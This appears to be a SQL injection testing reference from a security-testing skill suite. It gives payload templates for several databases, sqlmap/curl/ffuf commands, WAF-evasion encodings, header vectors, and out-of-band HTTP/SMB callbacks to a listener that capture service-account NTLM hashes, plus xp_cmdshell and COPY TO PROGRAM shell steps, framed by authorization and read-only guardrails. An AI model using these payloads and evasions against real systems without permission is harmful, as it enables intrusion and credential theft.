# sqli-testing — Payloads, Templates & Tool Invocations (references/payloads.md)

Cross-cutting material for `SKILL.md` and both variant files. Everything here is a
**template**: `<PLACEHOLDER>` slots only, never hardcoded live targets. Keep proofs
read-only — no `DROP`/`DELETE`/`UPDATE`/`INSERT`, no heavy/DoS payloads, against
third-party targets (see `SKILL.md` §1).

## Table of contents

1. [Detection ladder: safe probe → differential → confirmation](#1-detection-ladder-safe-probe--differential--confirmation)
2. [Payload templates per DBMS](#2-payload-templates-per-dbms)
3. [Tool invocation templates](#3-tool-invocation-templates)
4. [WAF-evasion encoding / obfuscation table](#4-waf-evasion-encoding--obfuscation-table)
5. [Header-based vectors](#5-header-based-vectors)
6. [Blind OOB HTTP/SMB variants](#6-blind-oob-httpsmb-variants)
7. [Time-based confirmation: differential timing, not fixed sleeps](#7-time-based-confirmation-differential-timing-not-fixed-sleeps)
8. [Chain it with (suite cross-references)](#8-chain-it-with-suite-cross-references)

---

## 1. Detection ladder: safe probe → differential → confirmation

Never jump rungs. Each rung has an exit criterion and a bail-out.

**Rung 0 — Baseline capture (no injection).**
Send the unmodified request 3×; record status, length, body hash, mean time.
Replace nothing yet. Exit: you have a stable reference (or you know the noise floor
±N bytes / ±X ms). Bail: if the baseline itself is nondeterministic (nonces,
timestamps), find a stable comparison axis (row presence, error class) first.

**Rung 1 — Safe probe (does syntax reach the DB?).**
- String context: `'` (single quote), `' '` (quote + space), `\` (backslash, MySQL escape-pair), `"` if double-quoted.
- Numeric/identifier context: `1 AND 1`, `1' AND '1'='1` shaped probes are already *differential* — keep them for rung 2; rung 1 just needs *any* parser reaction.
- Comment probe: `1--`, `1#`, `1-- -` (Oracle/* need `-- ` trailing space or `#`).
Exit: error text / status change / empty result vs baseline → you have a *lead*.
Bail: identical responses 3/3 → try the other context (int vs string vs header,
V-08 transports) or move on; don't escalate blindly.

**Rung 2 — Differential test (is it MY condition?).**
Send the *pair*, never payload-vs-baseline:
- Boolean pair (V-03): `' AND 1=1-- ` vs `' AND 1=2-- ` — observe row count/content/status.
- Quote-balance pair: `' AND 'a'='a` vs `' AND 'a'='b`.
- Time pair (V-04): `IF(1=1,SLEEP(<n>),0)` vs `IF(1=2,SLEEP(<n>),0)` — §7 method.
Exit: the *pair* flips deterministically 3/3 → proceed to confirmation.
Bail: both branches behave alike, or flips are jittery → FP filter (V-03/V-04 false-positives sections: caches, WAF shape-delays, dynamic content).

**Rung 3 — Confirmation (second, independent signal).**
Pick a signal *different* from the one that gave you the lead:
- Error lead → boolean flip + timing delta.
- Boolean lead → timing delta or OOB callback (V-05) or ground-truth match (extract a value you already know: your own username's first char).
- Timing lead → boolean flip anywhere in the app, or OOB, or engine error on `CAST` (V-01).
- Also confirm *falseness control*: made-false payload → effect gone (3/3).
Exit: two independent signals + false-condition control = **confirmed** (report per
`SKILL.md` §4-5). One signal = lead, keep it in notes.

**Extraction rung (post-confirmation, authorized data only).** Switch to the
extraction shape of your variant (union rows / error windows / boolean binary search
/ OOB labels), stay read-only, own-account or aggregate proof only, and pace requests
(no bursts, no sleep loops — DoS guardrail).

---

## 2. Payload templates per DBMS

`<BASE>` = the benign baseline value of the parameter. `<SUB>` = your subquery
(read-only). `<N>` = delay seconds (1-3). Replace placeholders; adjust quotes to the
literal context (remove the leading `'` for unquoted/numeric slots).

### MySQL / MariaDB
| Purpose | Template |
|---|---|
| Quote probe | `<BASE>'` / `<BASE>\` |
| Error engine (schema) | `<BASE>' AND EXTRACTVALUE(1,CONCAT(0x7e,(<SUB>)))-- ` |
| Error alt | `<BASE>' AND UPDATEXML(1,CONCAT(0x7e,(<SUB>)),1)-- ` |
| Union (column count found) | `<BASE>' UNION ALL SELECT <NULLS-with-<index>=<expr>-- ` |
| Boolean | `<BASE>' AND (<COND>)-- ` |
| Time | `<BASE>' AND IF((<COND>),SLEEP(<N>),0)-- ` |
| String→hex (quoteless) | `<SUB>` as `0x<hex>` / `CHAR(97,98,99)` |
| File read (priv check first) | `<BASE>' AND LOAD_FILE('<FILE>')-- ` |
| Stacked | `<BASE>'; SELECT <READ-ONLY-EXPR>-- ` |

Schema: `information_schema.tables/columns`, `database()`, `version()`, `current_user()`.

### PostgreSQL
| Purpose | Template |
|---|---|
| Error engine | `<BASE>' AND 1=CAST((<SUB>) AS INT)-- ` |
| Error alt (div-zero) | `<BASE>' AND 1/(CASE WHEN <COND> THEN 0 ELSE 1 END)-- ` (or `||` literal-cast) |
| Union | `<BASE>' UNION ALL SELECT <NULLS>,<expr>-- ` |
| Boolean | `<BASE>') AND (<COND>)-- ` (adjust to paren depth of real query) |
| Time | `<BASE>'; SELECT CASE WHEN (<COND>) THEN pg_sleep(<N>) ELSE pg_sleep(0) END-- ` |
| Concat/string | `chr(97)||chr(98)`, `substr((<SUB>),<off>,1)`, `ascii(...)` |
| Stacked (native) | `<BASE>; SELECT <READ-ONLY-EXPR>-- ` |
| RCE-ish (superuser, lab) | `; COPY (SELECT 1) TO PROGRAM 'id'` → **see V-10 + `rce-testing`** |

Schema: `pg_catalog.pg_tables`, `information_schema.columns`, `current_database()`, `version()`.

### MSSQL
| Purpose | Template |
|---|---|
| Quote probe | `<BASE>'` (error: `Unclosed quotation mark`) |
| Error engine | `<BASE>' AND 1=CONVERT(INT,(<SUB>))-- ` |
| Union | `<BASE>' UNION ALL SELECT <NULLS>,<expr>-- ` |
| Boolean | `<BASE>' AND (<COND>)-- ` |
| Time | `<BASE>'; IF (<COND>) WAITFOR DELAY '0:0:<N>'-- ` |
| String | `SUBSTRING((<SUB>),<off>,1)`, `ASCII(...)`, `+` concat, `TOP <n>` |
| Stacked | `<BASE>'; SELECT <READ-ONLY-EXPR> ;--` |
| OOB / shell | `'; EXEC master..xp_cmdshell 'whoami'-- ` → **V-10 + `rce-testing`** |

Schema: `sys.objects`, `sys.columns`, `sys.databases`, `@@version`, `IS_SRVROLEMEMBER('sysadmin')`.

### Oracle
| Purpose | Template |
|---|---|
| String probe | `<BASE>'` (needs `FROM dual` in unions) |
| Error engine | `<BASE>' AND 1=CTXSYS.DRITHSX.SN(1,(<SUB>))-- ` |
| Error alt | `<BASE>' AND 1=TO_NUMBER((<SUB>))-- ` (or `UTL_INADDR`-flavored) |
| Union | `<BASE>' UNION ALL SELECT <expr> FROM dual-- ` |
| Boolean | `<BASE>' AND (<COND>)-- ` |
| Time | `<BASE>' AND CASE WHEN (<COND>) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',<N>) ELSE 0 END=1-- ` |
| String | `SUBSTR`, `ASCII`, `||` concat, `ROWNUM` for paging |
| OOB/network | `UTL_HTTP.REQUEST('http://<NONCE>.<OAST>')` → V-05 |

Schema: `all_tables`, `all_tab_columns`, `all_users`, `user`, `v$version`, `ROWNUM`.

### SQLite
| Purpose | Template |
|---|---|
| Error probe | `<BASE>'` → `near "...": syntax error` |
| Boolean | `<BASE>' AND (<COND>)-- ` |
| Union | `<BASE>' UNION SELECT <NULLS>,<expr>-- ` |
| Time | no native sleep — use boolean only (or `LIKE`/`randomblob` heavy ops **avoid on prod** — DoS guardrail) |
| Schema | `sqlite_master` (`name`, `sql`), `sqlite_temp_master` |
| File/attach (lab) | `'; ATTACH DATABASE '/tmp/<x>.db' AS p;-- ` → V-10 |

### NoSQL (MongoDB-shaped) — see V-13
- `{"user":"<BASE>","pass":{"$ne":""}}` · `{"pass":{"$regex":"^<CHAR>"}}` · `{"id":{"$gt":0}}`
- Form-param: `user=<BASE>&pass[$ne]=` · `?id[$regex]=^<CHAR>` · `$where` → `rce-testing` note.

---

## 3. Tool invocation templates

**sqlmap** — flags as a template; fill placeholders, keep level/risk conservative:

```
sqlmap -u 'https://<TARGET.HOST>/<PATH>?<PARAM>=<BASE>' \
  --batch \
  --level=<1-3> --risk=<1-2> \
  --tamper=<script1,script2> \
  --technique=<EUBST> \
  [--os-shell] [--dbs] [--tables] [--dump -T <TABLE> -C <COLUMNS> --where '<OWN-ROW-FILTER>']
```

- `--batch` — never prompt; unsupervised runs.
- `--level=<1-3>` / `--risk=<1-2>` — **keep conservative (level 1-2, risk 1) on
  production/third-party targets**: level 3 and risk 2-3 add header/UA/cookie tests
  and heavier DoS-shaped payloads (long `BENCHMARK`, big `randomblob`) that violate
  the guardrail. Raise only on your own lab or with explicit program permission.
- `--tamper=<script>` — evasion scripts (`space2comment`, `randomcase`,
  `between`, `chardoubleencode`, `percentage`) → §4 table; tamper bypasses filters,
  it does not make the test "safe" — see also V-11/V-12.
- `--technique=<letters>` — `E`rror, `U`nion, `B`oolean, `S`tacked, `T`ime. Start
  `EB` (fast, safe); add `T` only after §7's differential baseline; add `S` only
  when V-06 preconditions hold; `T`+`B` together is the reliable confirmation pair.
- `--os-shell` — only after DB privileges confirmed (V-10) **and** target is in
  scope for command-exec proof; on third-party targets prefer read-only output
  (`--banner`, `--current-user`, `--tables`) over shell attempts. Never follow with
  write/shell *payloads* on out-of-lab targets.
- `--dump ... --where` — constrain extraction to your own rows; never blanket-dump
  third-party tables.

**curl** differential pair (manual repro for reports):

```
curl -s -o /tmp/<A>.body -w '%{http_code} %{time_total} %{size_download}\n' \
  -X <METHOD> 'https://<TARGET.HOST>/<PATH>' \
  -H 'Cookie: <SESSION>' --data-urlencode '<PARAM>=<PAYLOAD-TRUE>'

curl -s -o /tmp/<B>.body -w '%{http_code} %{time_total} %{size_download}\n' \
  -X <METHOD> 'https://<TARGET.HOST>/<PATH>' \
  -H 'Cookie: <SESSION>' --data-urlencode '<PARAM>=<PAYLOAD-FALSE>'
diff <(sort /tmp/<A>.body) <(sort /tmp/<B>.body) | head
```

**ffuf** parameter discovery (find the sink before exploiting):

```
ffuf -u 'https://<TARGET.HOST>/<PATH>?FUZZ=<BASE>' \
  -w <WORDLIST: e.g. params.txt> -mc all -fs <BASELINE-BODY-LENGTH> -t <CONCURRENCY: keep polite>
```

Header vectors (V notes): `-H 'User-Agent: <PAYLOAD>'` / `-H 'Referer: <PAYLOAD>'`
/ `-H 'Cookie: <KEY>=<PAYLOAD>'` — or fuzz headers themselves:
`-H 'X-<FUZZ>: 1' -H 'FUZZ: <PAYLOAD>'`.

**OOB listener** (V-05): Burp Collaborator / interactsh client — insert
`<NONCE>.<OAST-HOST>` per probe, fresh nonce every payload, correlate by timestamp.

---

## 4. WAF-evasion encoding / obfuscation table

Test each in *both* raw and encoded form (decode pipeline: proxy → WAF → app → DB).
One change per request — never assume which layer ate the payload (V-11).

| Target char / token | Transformation | Example output | Notes |
|---|---|---|---|
| `'` quote | URL-encode | `%27` | universal first try |
| `'` quote | Double-encode | `%2527` | needs double-decode app / WAF single-decode |
| `'` quote | SQL quote-doubling | `''` | inside quoted literals |
| space | Tab / newline / VT / CR | `%09` `%0a` `%0b` `%0d` | MySQL accepts; splits `UNION\s+SELECT` regexes |
| space | Inline comment | `/**/` | `UNION/**/SELECT`, `IF(**,SLEEP(2),0)` |
| space | Paren adjacency | `IF(...)` | no space needed before `(` |
| `UNION SELECT` | Comment-joined | `UNION/**/SELECT` | keep tokens adjacent-joined too: `UNI/**/ON` |
| keywords | Case randomization | `SeLeCT`, `uNiOn` | SQL keywords case-insensitive; WAF often not |
| keyword letter | Percent-encode one letter | `%53ELECT` (`S`→`%53`) | encode inside the token |
| keyword | MySQL versioned comment | `/*!50000UNION*/` | MySQL executes inside `/*!...*/`, WAF may not parse |
| `OR` / `AND` | Logical alternatives | `\|\|` `&&` `!` | MySQL; `%7c` `%26` for `|` `&` |
| `=` | Comparison alternatives | `<>` `!=` `LIKE` `RLIKE` | `AND 1<>2` etc. |
| string literal | Hex literal | `0x61646d696e` | no quotes at all (MySQL) |
| string literal | CHAR/CONCAT build | `CHAR(97,98,99)` | defeats literal-matching filters (V notes: concat obfuscation) |
| string literal | Postgres decode | `chr(97)\|\|chr(98)`, `decode('61','hex')` | quoteless on PG |
| `-- ` comment | Variants | `--%20` `#` `;%23` | `#` MySQL only; Oracle needs `-- ` (trailing space) |
| `SLEEP`/`WAITFOR` | Split + comment | `SL/**/EEP(2)`, `WAITFOR/**/DELAY` | pair with §7 differential |
| Unicode | Fullwidth / NFKC fold | `＇` `%ef%bc%87` | only if a normalizer folds before SQL |
| Unicode | Overlong UTF-8 | `0xC0 0xA7` | rare; Java/PHP legacy filters |
| payload chunk | Base64 wrapper | `<b64(payload)>` | only when app decodes base64 pre-query |
| `;` stacked | Encoded separator | `%3b`, `;%0a` | V-06 + V-11 |
| whole payload | JSON/XML body move | see V-08 | WAF inspects query string only |
| payload order | Query-string smuggling | param placed in `Referer`/`X-Forwarded-*` | §5 headers |

Escape hatch: if the WAF blocks *all* quote forms, switch variant (identifier
context V-09, NoSQL operators V-13, truncation V-14) instead of encoding forever.

---

## 5. Header-based vectors (User-Agent, Referer, Cookie)

Headers reach SQL sinks that are invisible to parameter scanners — log insertion
(`INSERT INTO access_log ...` — second-order via V-07 when admins view logs),
session lookup (`WHERE session='<Cookie>'`), geo/rate-limit lookups, analytics.
Probe every variant's ladder through, in likelihood order:

| Header | Typical sink | Probe (then full ladder) |
|---|---|---|
| `Cookie: <KEY>=<VAL>` | session/cache lookup | `<VAL> = <BASE>'` → boolean pair → §7 timing |
| `User-Agent:` | access-log INSERT | `<BASE>'` → rung 2 → **trigger the consumer** (visit any page that renders logs) |
| `Referer:` | analytics/redirect-check tables | same as UA |
| `X-Forwarded-For` / `X-Real-IP` | geo/rate-limit/whitelist SQL | `<BASE>'` , `1 OR 1=1` |
| `X-Request-Id` / `Correlation-Id` | tracing DB inserts | `'` probe + consumer trigger |
| Custom `X-*` the API documents | anything | ffuf header fuzzing (`§3`) |

Notes: raw spaces/newlines may need `%09`/`%0a` (HTTP forbids bare ones); the
`Cookie` value often needs the *session token preserved* — inject in a **second**
cookie (`tracking=<PAYLOAD>`), never clobber your own auth; log-based hits are
**second-order**: confirm via V-07 (write then view the log page), not by the
response of the request that set the header.

---

## 6. Blind OOB HTTP/SMB variants (no DNS egress)

When V-05's DNS channel is filtered but TCP works — or when you want a *boolean via
callback presence*:

- **HTTP callback, Oracle:** `' AND UTL_HTTP.REQUEST('http://<NONCE>.<OAST-HOST>/<CHAR>') IS NOT NULL-- ` — encode data in the path (`/<offset>-<char>`), one char per probe.
- **HTTP callback, SQL Server:** `'; EXEC master..sp_addlinkedsrvlogin ...`/`OPENROWSET` shapes, or `xp_fileexist 'http://...'` where applicable → keep read-only; primary primitive: `xp_dirtree '\\<HOST>\<SHARE>\<NONCE>'`.
- **SMB/UNC, SQL Server:** `xp_dirtree '\\<OAST-SMB-HOST>\<SHARE>\<NONCE>'` / `LOAD_FILE('\\\\<HOST>\\x')` — your listener on 445 receives the service account's NTLMv2 challenge/response = **credential material** (redact hashes in public reports; note chain to `info-disclosure-testing`).
- **SMB/UNC, MySQL:** `' AND LOAD_FILE('\\\\<HOST>\\<NONCE>')-- ` (needs `FILE`).
- **Conditional-fetch boolean (no data encoding needed):** wrap the fetch in
  `CASE WHEN (<COND>) THEN <fetch> END` — callback = true, silence = false.
  Confirmation: callback tracks the condition truth 3/3 with **fresh nonce per
  probe**; rule out wildcard DNS and client-side fetches (verify source IP is the
  DB host, V-05 FP list).
- **Guardrail:** these are *read/notify* primitives only — never OOB-delete,
  never write files outside your own lab, never hammer callbacks (rate: a probe
  burst is a DoS on *your* listener and noisy on theirs — pace it).

---

## 7. Time-based confirmation: differential timing, not fixed sleeps

A payload that "took 3 seconds" proves nothing — the target may just be slow.
Confirm with **differential timing**: identical-shaped requests where only the
condition's *truth* changes.

**Method:**
1. **Baseline distribution:** 5+ requests of the *unmodified* request → mean `μ₀`, range. No baseline, no test.
2. **Matched pair, same shape:** `TRUE = ' AND IF((1=1),SLEEP(<N>),0)-- '` vs `FALSE = ' AND IF((1=2),SLEEP(<N>),0)-- '`. Same length, same tokens, only the condition differs. *(Engine swap: PG `CASE WHEN ... THEN pg_sleep(<N>) ELSE pg_sleep(0) END`; MSSQL `IF (1=1) WAITFOR DELAY '0:0:<N>'` vs `IF (1=2)...`; Oracle `DBMS_PIPE.RECEIVE_MESSAGE('x',<N>)` gated in `CASE`.)*
3. **≥3 samples each, interleaved** (T,F,T,F,... to cancel drift). Record raw seconds.
4. **Pass criteria:** `min(TRUE samples) > max(FALSE samples) + <N>×0.6` (e.g. sleeps of 3s: TRUE ≥ 3.0s, FALSE ≤ baseline+noise), *and* FALSE ≈ `μ₀`. Non-overlapping clusters = signal; overlapping = not confirmed.
5. **Condition carries data:** swap `1=1` for `ASCII(SUBSTR((<SUB>),1,1))=<code>` — the delay must *move* with the comparison. That is the extraction oracle (V-04/V-15).
6. **FP checks (do these before reporting):**
   - *Shape-delay:* WAF/scanner latency inflates **both** branches — that's why the pair must be same-shaped; if both delay ~equally, the DB isn't sleeping.
   - *Cache:* add cache-busting or use POST; a cached TRUE hides the effect.
   - *Per-row multiplication:* `SLEEP` in a `WHERE` over N rows → delay ≈ N×`<N>` — normalize (target `LIMIT 1`/`HAVING`-single-row contexts) or note N.
   - *Timeout cap:* if the app or proxy times out at `<N>`+ε, lower `<N>` to 1-2s; don't treat "both slow" as pass.
   - *Random jitter:* 1 sample never passes; only distributions pass.
7. **Evidence for the report:** the timing table (sample → seconds per branch), parameters, and the boolean/OOB second signal (§1 rung 3).

**Do NOT:** loop `SLEEP` in scripts against third-party targets, stack hundreds of
delay probes, or use heavy-query timing (`REPEAT`, big joins) as the sleep — those
are DoS-shaped and violate `SKILL.md` §1. Pace: a few paired probes, then stop.

---

## 8. Chain it with (suite cross-references)

| Chain | From this skill | To | What to hand off |
|---|---|---|---|
| **DB-specific command execution → RCE/SSRF** | V-10 (`INTO OUTFILE`/`LOAD_FILE`, `xp_cmdshell`, `COPY ... TO/FROM PROGRAM`, `UTL_HTTP`/`DBMS_SCHEDULER`, SQLite `ATTACH`/`load_extension`), OOB HTTP/SMB §6 | **`rce-testing`** | Privilege-confirmed command/file primitive: shell-command shaping (`whoami` proof), NTLM-relay/SSRF-flavored OAST callbacks, outfile→webshell upload validation, `$where`/UDF paths. Report SQLi as the delivery vector; let that skill carry the RCE/SSRF impact framing. |
| **Schema + credential combo** | V-01 error schema, V-02 union dump, V-15 blind extraction (table/column names, `users`, `settings`, `config`) | **`info-disclosure-testing`** | Extracted schema + reachable file reads (`LOAD_FILE` of app config) cross-referenced with leaked `.env`/config credentials — where do the extracted creds actually unlock something? Pairs schema dumps with `.git`/`.env`/s3/secret leaks for a combined impact story. |
| **Authenticated parameter tampering** | V-02/V-03 payloads inside authenticated endpoints, V-09 `offset`/`limit` paging abuse, V-13 operator injection on `userId`-style filters | **`bac-idor-testing`** | Injection-assisted access control: negative-value IDs, operator-bypassed ownership filters (`{"owner":{"$ne":"me"}}`), pagination that walks other users' rows, mass-assignment-adjacent params discovered during sink mapping. If the *only* bug is "I can read row 5 by changing 4→5" without SQL logic, it's BAC, not SQLi — hand it over. |
| Reflected input → XSS escaping gaps | Any variant where the payload echoes verbatim | `xss-testing` | Injection probes reflected unencoded (distinct finding, separate CWE). |
| Heavy-query / sleep abuse observations | V-04/V-12 timing side notes | `business-logic-testing` | If timing reveals a *race/logic* flaw beyond injection, hand that half off. |
